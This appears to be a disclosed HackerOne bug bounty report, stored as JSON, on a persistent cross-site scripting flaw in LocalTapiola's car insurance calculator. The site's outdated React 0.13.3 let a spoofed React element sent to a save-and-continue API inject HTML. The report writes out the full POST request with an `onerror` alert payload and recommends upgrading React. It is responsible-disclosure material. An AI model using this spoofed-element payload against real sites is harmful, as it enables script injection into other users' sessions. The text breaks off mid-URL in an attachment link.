{"id":139004,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzkwMDQ=","url":"https://hackerone.com/reports/139004","title":"Persistent XSS at verkkopalvelu.tapiola.fi using spoofed React element and React v.0.13.3","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-05-15T21:21:03.025Z","submitted_at":"2016-05-15T21:21:03.025Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fransrosen","url":"/fransrosen","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-06-27T22:32:08.453Z","bug_reporter_agreed_on_going_public_at":"2016-06-27T22:32:08.376Z","team_member_agreed_on_going_public_at":"2016-06-27T22:26:59.450Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\n## Background\nI noticed that the app at:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/\n\nwas running an old version of React. In this version (0.13.3) there's an issue, initially discovered by @danlec actually on HackerOne: http://danlec.com/blog/xss-via-a-spoofed-react-element \n\nThe patch by React was made in version 0.14: https://facebook.github.io/react/blog/2015/10/07/react-v0.14.html\n\n## PoC\n\nSo I noticed that the application had a possible way to save a registration in the middle of the process, being able to get an URL to continue with the registration. This save would make a call that looked like this:\n\n```\nPOST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nContent-Type: application/json\n\n{\n    \"79rtwta5z4hjkn3npvu5ak0521\": {\n        \"dateOfIntroduction\": {\n            \"isValid\": true, \n            \"error\": \"\", \n...\n}\n```\n\nThis would then respond with a unique identifier:\n```\n{\"id\":\"ID\"}\n```\nThis data would then be used, if you used a link formatted like this:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/ID\n\nThe problem, apart from running an old version of React, is that the JSON being saved is not controlled in any way what content it has, which means you're able to extend the JSON further. Now, the content in the elements are being placed inside the DOM of the page, especially the `\"error\"`-element.\n\nSo, to use @danlec's way to inject a spoofed React element, we use the following request:\n\n```\nPOST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nConnection: keep-alive\nContent-Length: 875\nAccept: application/json, text/javascript\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nCookie: caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789;\n\n{\"79rtwta5z4hjkn3npvu5ak0521\":{\"postCode\":{\"isValid\":true,\"error\":{\"_store\":{},\"type\":\"body\",\"props\":{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cimg src=x onerror=alert(document.domain)\u003e\"}},\"_isReactElement\":true},\"value\":\"jjj\"},\"dateOfIntroduction\":{\"isValid\":true,\"error\":\"\",\"value\":\"JAJAJA\"},\"cylinderCapacity\":{\"isValid\":true,\"error\":\"\",\"value\":\"yyy\"},\"manufacturerCode\":{\"isValid\":true,\"error\":\"\",\"value\":\"zzz\"},\"netPower\":{\"isValid\":true,\"error\":\"\",\"value\":\"bbb\"},\"birthDate\":{\"isValid\":true,\"error\":\"\",\"value\":\"11.11.2011xxx\"},\"grossWeight\":{\"isValid\":true,\"error\":\"\",\"value\":\"ccc\"},\"carType\":{\"isValid\":true,\"error\":\"\",\"value\":\"x\"},\"isRentedOrLeased\":{\"isValid\":true,\"error\":\"\",\"value\":\"eee\"},\"registrationPart2\":{\"isValid\":true,\"error\":\"\",\"value\":\"fff\"},\"modelCode\":{\"isValid\":true,\"error\":\"\",\"value\":\"ggg\"},\"registrationPart1\":{\"isValid\":true,\"error\":\"\",\"value\":\"hhh\"}}}\n```\n\nYou can see my inserted payload here:\nhttps://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\n\nWhich would then result in the following URL using the React app:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\n\nWhich has the following output in the DOM:\n\n{F94020}\n\nThat results in the javascript running when accessing the page:\n\n{F94022}\n\n## Solution\n\nYou should update the React version to \u003e0.14 (and most likely also change so the structure of the JSON that is getting saved is controlled by you.\n\nRegards,\nFrans","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\n\u003cp\u003eI noticed that the app at:\u003cbr\u003e\n\u003ca title=\"https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/\" href=\"/redirect?url=https%3A%2F%2Fverkkopalvelu.tapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003ewas running an old version of React. In this version (0.13.3) there\u0026#39;s an issue, initially discovered by \u003ca href=\"/danlec\"\u003e@danlec\u003c/a\u003e actually on HackerOne: \u003ca title=\"http://danlec.com/blog/xss-via-a-spoofed-react-element\" href=\"/redirect?url=http%3A%2F%2Fdanlec.com%2Fblog%2Fxss-via-a-spoofed-react-element\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://danlec.com/blog/xss-via-a-spoofed-react-element\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eThe patch by React was made in version 0.14: \u003ca title=\"https://facebook.github.io/react/blog/2015/10/07/react-v0.14.html\" href=\"/redirect?url=https%3A%2F%2Ffacebook.github.io%2Freact%2Fblog%2F2015%2F10%2F07%2Freact-v0.14.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://facebook.github.io/react/blog/2015/10/07/react-v0.14.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"poc\"\u003ePoC\u003c/h2\u003e\n\n\u003cp\u003eSo I noticed that the application had a possible way to save a registration in the middle of the process, being able to get an URL to continue with the registration. This save would make a call that looked like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nContent-Type: application/json\n\n{\n    \u0026quot;79rtwta5z4hjkn3npvu5ak0521\u0026quot;: {\n        \u0026quot;dateOfIntroduction\u0026quot;: {\n            \u0026quot;isValid\u0026quot;: true, \n            \u0026quot;error\u0026quot;: \u0026quot;\u0026quot;, \n...\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis would then respond with a unique identifier:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;id\u0026quot;:\u0026quot;ID\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis data would then be used, if you used a link formatted like this:\u003cbr\u003e\n\u003ca title=\"https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/ID\" href=\"/redirect?url=https%3A%2F%2Fverkkopalvelu.tapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2F%23%2Fcontinue%2FID\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/ID\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe problem, apart from running an old version of React, is that the JSON being saved is not controlled in any way what content it has, which means you\u0026#39;re able to extend the JSON further. Now, the content in the elements are being placed inside the DOM of the page, especially the \u003ccode\u003e\u0026quot;error\u0026quot;\u003c/code\u003e-element.\u003c/p\u003e\n\n\u003cp\u003eSo, to use \u003ca href=\"/danlec\"\u003e@danlec\u003c/a\u003e\u0026#39;s way to inject a spoofed React element, we use the following request:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nConnection: keep-alive\nContent-Length: 875\nAccept: application/json, text/javascript\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nCookie: caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789;\n\n{\u0026quot;79rtwta5z4hjkn3npvu5ak0521\u0026quot;:{\u0026quot;postCode\u0026quot;:{\u0026quot;isValid\u0026quot;:true,\u0026quot;error\u0026quot;:{\u0026quot;_store\u0026quot;:{},\u0026quot;type\u0026quot;:\u0026quot;body\u0026quot;,\u0026quot;props\u0026quot;:{\u0026quot;dangerouslySetInnerHTML\u0026quot;:{\u0026quot;__html\u0026quot;:\u0026quot;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt;\u0026quot;}},\u0026quot;_isReactElement\u0026quot;:true},\u0026quot;value\u0026quot;:\u0026quot;jjj\u0026quot;},\u0026quot;dateOfIntroduction\u0026quot;:{\u0026quot;isValid\u0026quot;:true,\u0026quot;error\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;JAJAJA\u0026quot;},\u0026quot;cylinderCapacity\u0026quot;:{\u0026quot;isValid\u0026quot;:true,\u0026quot;error\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;yyy\u0026quot;},\u0026quot;manufacturerCode\u0026quot;:{\u0026quot;isValid\u0026quot;:true,\u0026quot;error\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;zzz\u0026quot;},\u0026quot;netPower\u0026quot;:{\u0026quot;isValid\u0026quot;:true,\u0026quot;error\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;bbb\u0026quot;},\u0026quot;birthDate\u0026quot;:{\u0026quot;isValid\u0026quot;:true,\u0026quot;error\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;11.11.2011xxx\u0026quot;},\u0026quot;grossWeight\u0026quot;:{\u0026quot;isValid\u0026quot;:true,\u0026quot;error\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;ccc\u0026quot;},\u0026quot;carType\u0026quot;:{\u0026quot;isValid\u0026quot;:true,\u0026quot;error\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;x\u0026quot;},\u0026quot;isRentedOrLeased\u0026quot;:{\u0026quot;isValid\u0026quot;:true,\u0026quot;error\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;eee\u0026quot;},\u0026quot;registrationPart2\u0026quot;:{\u0026quot;isValid\u0026quot;:true,\u0026quot;error\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;fff\u0026quot;},\u0026quot;modelCode\u0026quot;:{\u0026quot;isValid\u0026quot;:true,\u0026quot;error\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;ggg\u0026quot;},\u0026quot;registrationPart1\u0026quot;:{\u0026quot;isValid\u0026quot;:true,\u0026quot;error\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;value\u0026quot;:\u0026quot;hhh\u0026quot;}}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYou can see my inserted payload here:\u003cbr\u003e\n\u003ca title=\"https://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\" href=\"/redirect?url=https%3A%2F%2Fverkkopalvelu.lahitapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2Fapi%2Fvehicle%2Flink%2Fcontinue%2Fc455cb02-6a14-4767-9c63-eb22d9c16be5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWhich would then result in the following URL using the React app:\u003cbr\u003e\n\u003ca title=\"https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\" href=\"/redirect?url=https%3A%2F%2Fverkkopalvelu.tapiola.fi%2Fe2%2Fautovakuutus%2Fvakuutuslaskuri%2F%23%2Fcontinue%2Fc455cb02-6a14-4767-9c63-eb22d9c16be5\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWhich has the following output in the DOM:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2016-05-15_at_23.09.13.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/020/9bc61b08fed82c63adfa74d759f999c11f462f1a/Screen_Shot_2016-05-15_at_23.09.13.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-05-15_at_23.09.13.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-05-15_at_23.09.13.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T042732Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026amp;X-Amz-Signature=9535b3f4c0eb1fb5adcfb60b5346089acfdbd1df544174c3029e2ddcf6703910\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/020/9bc61b08fed82c63adfa74d759f999c11f462f1a/Screen_Shot_2016-05-15_at_23.09.13.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-05-15_at_23.09.13.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-05-15_at_23.09.13.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T042732Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026amp;X-Amz-Signature=9535b3f4c0eb1fb5adcfb60b5346089acfdbd1df544174c3029e2ddcf6703910\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThat results in the javascript running when accessing the page:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2016-05-15_at_23.00.25.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/022/8c7069981da948310e62733c5fe99807a713c5e5/Screen_Shot_2016-05-15_at_23.00.25.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-05-15_at_23.00.25.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-05-15_at_23.00.25.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T042732Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026amp;X-Amz-Signature=e53c9283412fd083ccbc20d8ecc9b88ff2c55b8cd310cf8c6604cbe7bf653118\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/022/8c7069981da948310e62733c5fe99807a713c5e5/Screen_Shot_2016-05-15_at_23.00.25.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-05-15_at_23.00.25.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-05-15_at_23.00.25.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T042732Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDTd4bBwR4jJMppOWz7EU3ySwJK1geVZm7GvrSHyp8wAx03nVbAIisdh9q5SCYJs%2FJTXi%2Fsm9znfJcHgIy1DUYcyZol0zQmN4hQAlOUZZ6AJANKMjzew6Gbci4hpgZqkt7kMNinONmzU36EDiWMOc0y0LBIMMe8ckWdal2vM1amkx9g4%2B7jkxStLKe4Ry%2FVeqOEFeDj5B3%2Fim8atXFDPnaA6ZctYC0kADebiu9zFF1dQsSdkzsLG93dLAMR0ARXm0vun9nbqpp5oxDQafvSrdE7oDp0yem%2B391K5yvQ%2FVkTdyMd797ooD1IAYqUdwlX0lVblqv9ErzI2EUbOnFhO5widZFoU8s5JQDxyTzDlNAHHPnQpU8XD7uIRyR%2Bh43I9VvsEn1pERJ2rOM57I1PkAM8vesvdhiNkLY7KsmmB1q5drdmKxzSDeK5uPJY%2F7b6ZdCcYzDgNfX18d6h0A0FHbvXn7qPH9NQWGUsNXamCikRs9AA%2BK%2BzqwxI%2FlZdCdkUBJNbFqefOmuHA6y4DCuw6r%2FBTrqAZ4iBH5JOWBgJ5BPglFYT1gWFkwyMqq8gmMxb5SeS%2FjunuR9x9HhadmGfzTt7avXh7ra%2BbCbT8G5EBTHekw5tLrBpYwkzmLiedzIpJ4pJqrAXmk%2B6qfKdpUFGOfE%2FoOdzhIkM32hFOTOwwCcLwfUCOQXCXHweJlGlDZdV%2FgvnAv5llJv80AS6mRncqu5cTdZ6kwskL6mtLuZx022Hs9iVQEhZVcVFVxWNFIMlrPZufuNWFtnv13RkAoiqYOJgDn3UWRAP9lucn7OMZs0NyqKFy1iLho2FCO%2BegcGHVqDf%2FVxOtLAlnkhjmFRxg%3D%3D\u0026amp;X-Amz-Signature=e53c9283412fd083ccbc20d8ecc9b88ff2c55b8cd310cf8c6604cbe7bf653118\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\n\u003cp\u003eYou should update the React version to \u0026gt;0.14 (and most likely also change so the structure of the JSON that is getting saved is controlled by you.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nFrans\u003c/p\u003e\n","bounty_amount":"300.0","formatted_bounty":"$300","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":94020,"file_name":"Screen_Shot_2016-05-15_at_23.09.13.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/020/9bc61b08fed82c63adfa74d759f999c11f462f1a/Screen_Shot_2016-05-15_at_23.09.13.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-05-15_at_23.09.13.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-05-15_at_23.09.13.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQW2BAZGD3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042732Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDf7CC1janFXxWWF6QZ1Z6X6%2F6j0WDhv4gDyzEWu%2BScUAIhAOhgsmE64VangXFyIz5AGmDMLeT8sYG2vBQ4PwiaYS%2FZKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igy754oCq3nK3vWmRbMqkQM98qKdRlMDT